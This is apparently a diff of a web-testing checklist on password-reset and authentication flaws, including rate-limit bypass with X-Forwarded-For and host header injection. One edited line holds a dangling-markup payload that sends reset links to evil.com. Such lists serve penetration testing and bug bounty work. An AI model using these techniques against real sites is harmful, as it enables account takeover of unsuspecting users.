@@ -21,6 +21,7 @@
   - While reseting password intercept request to burp and see if you cloud add <a href> tag and see in email if there anything changes. 
 
 > Authentication:
+	
 	- Bypass Rate Limit with X-Forwarded-For: to pwn authentication
 	- Host header injeciton in forgot password page
 	- Test Remember me functionality
@@ -38,7 +39,7 @@
 	- Bypass rate limit protection: You can use IP-Rotate burp extension or you can change system IP per request.
 	
 	- Password reset poisoning via dangling markup
-		Host: victim.com:'<a href="//evil.com/? Don't ">
+		Host: victim.com:'<a href="//evil.com/? Don't #">
 
 	- Add X-Forwarded-For: 127.0.0.1 or 1-1000 to bypass the rate limit protection.
 
